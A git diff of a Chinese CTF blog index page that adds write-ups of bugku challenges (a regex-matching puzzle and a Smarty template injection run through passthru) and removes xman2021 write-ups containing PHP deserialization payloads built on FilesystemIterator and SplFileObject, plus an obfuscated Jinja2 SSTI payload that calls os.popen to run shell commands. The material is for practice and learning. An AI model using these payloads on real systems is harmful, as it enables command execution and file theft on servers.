@@ -164,6 +164,193 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-bugku-web-字符？正则？" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/">bugku-web-字符？正则？</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/" class="archive-article-date">
+  	<time datetime="2021-08-10T11:16:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;flag&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>关于正则表达式，建议用这个网站——<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a><br>(可以现场看各种字符是什么意思，虽然是纯英文界面)<br>关于<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>的解释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.                                  匹配除 &quot;\n&quot; 之外的任何单个字符</span><br><span class="line"></span><br><span class="line">*                                 匹配它前面的表达式0次或多次，等价于&#123;0,&#125;</span><br><span class="line"></span><br><span class="line">&#123;4,7&#125;                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</span><br><span class="line"></span><br><span class="line">\&#x2F;                                匹配 &#x2F; ，这里的 \ 是为了转义</span><br><span class="line"></span><br><span class="line">[a-z]                           匹配所有小写字母</span><br><span class="line"></span><br><span class="line">[:punct:]                     匹配任何标点符号</span><br><span class="line"></span><br><span class="line">&#x2F;i                                表示不分大小写</span><br></pre></td></tr></table></figure>
+<p>所以我随便配了一个：key1key1234key:/1/1keya!</p>
+<p>得到flag</p>
+<img src="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/10/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-bugku-web-聪明的php" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">bugku-web-聪明的php</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/" class="archive-article-date">
+  	<time datetime="2021-08-09T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开以后发现是php代码，随便传值发现会打印形参和实参</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/1.PNG" class="" title="1.PNG">
+
+<p>盲猜是模板注入，试了一下<code>a=&#123;&#123;2*2&#125;&#125;</code><br>发现真的回显为4</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/3.PNG" class="" title="3.PNG">
+
+<p>有人是用tplmap扫了一下，发现是smarty构架，然后使用<code>&#123;if php代码&#125;&#123;/if&#125;</code>运行php程序<br>又因为很多命令执行被过滤了，所以只能用passthru()函数（过滤eval的同时会过滤``）<br>传入<code>｛if paathru(&#39;ls&#39;)&#125;&#123;/if&#125;</code>,发现可以执行，顺势tac出flag就好了</p>
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/5.PNG" class="" title="5.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/bugku-web-%E8%81%AA%E6%98%8E%E7%9A%84php/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-bugku-web-速度要快" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -885,197 +1072,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-xman2021-easyphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyphp/">xman2021-easyphp</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/08/xman2021-easyphp/" class="archive-article-date">
-  	<time datetime="2021-08-08T12:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>dasctf的原题,就改了一下文件结构和类名</p>
-<p>源码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public $para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class &#x3D; &quot;Hel&quot;;</span><br><span class="line">        $this-&gt;para &#x3D; &quot;xctfer&quot;;</span><br><span class="line">        echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; $a;</span><br><span class="line">        echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;xctf&#39;]))&#123;</span><br><span class="line">    unserialize($_GET[&#39;xctf&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这句我一开始不太明白这句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
-<p>然后搜了一下，结果就直接搜到原题了</p>
-<p>这句的意思是：$this-&gt;class类（其实当成函数看就行）的参数是$this-&gt;para</p>
-<p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
-
-<p>用SplFileObject读取文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">    public $para &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxXXXmMManNNn&#x2F;f1a4.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XMAN();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyphp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-xman2021-easyssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyssti/">xman2021-easyssti</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/08/xman2021-easyssti/" class="archive-article-date">
-  	<time datetime="2021-08-08T11:58:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>gwctf2019的原题，现在也可以在buuctf上做——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
-<p>虽然网上很多都在用curl ip端口的方法，<del>不过那个方法我怎么都没复现出来。</del>终于找到了原因：防火墙没开，想让外网发现自己，必须把防火墙的相应端口打开</p>
-<p>还好找到这个大佬的做法——<a target="_blank" rel="noopener" href="https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload——&#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&#125;</span><br></pre></td></tr></table></figure>
-<p>然后把whoami换成ls之类的shell指令就行</p>
-<img src="/2021/08/08/xman2021-easyssti/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/08/xman2021-easyssti/">展开全文 >></a>
         </p>
       
 
